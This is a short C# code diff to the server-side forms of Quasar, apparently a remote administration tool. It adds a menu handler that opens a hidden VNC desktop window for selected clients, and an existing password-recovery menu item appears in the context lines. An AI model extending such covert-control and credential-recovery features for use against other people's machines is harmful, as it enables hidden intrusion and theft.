@@ -679,6 +679,16 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmHvnc = FrmHVNCDesktop.CreateNewOrGetExisting(c);
+                frmHvnc.Show();
+                frmHvnc.Focus();
+            }
+        }
+
         private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Client[] clients = GetSelectedClients();
